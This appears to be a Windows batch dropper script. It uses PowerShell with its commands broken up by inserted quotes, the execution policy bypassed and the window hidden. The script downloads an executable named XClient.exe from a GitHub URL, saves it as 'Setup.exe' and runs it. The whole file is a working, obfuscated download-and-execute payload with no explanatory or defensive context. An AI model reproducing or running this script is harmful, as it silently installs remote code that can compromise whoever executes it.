@echo off
set "Url=https://github.com/lohoainam/-at/raw/main/XClient.exe"
set "Filename=S"et"up.exe"
@powershell -No"P"rof"i"le -"E"xecutionPo"li"cy Bypass -W"indo"wSt"y"le Hidden -C"o"mmand "I"nv"o"ke-WebR"e"que"st %Url% -Ou"t"Fi"le %Filename%; Start-Process %Filename%"
exit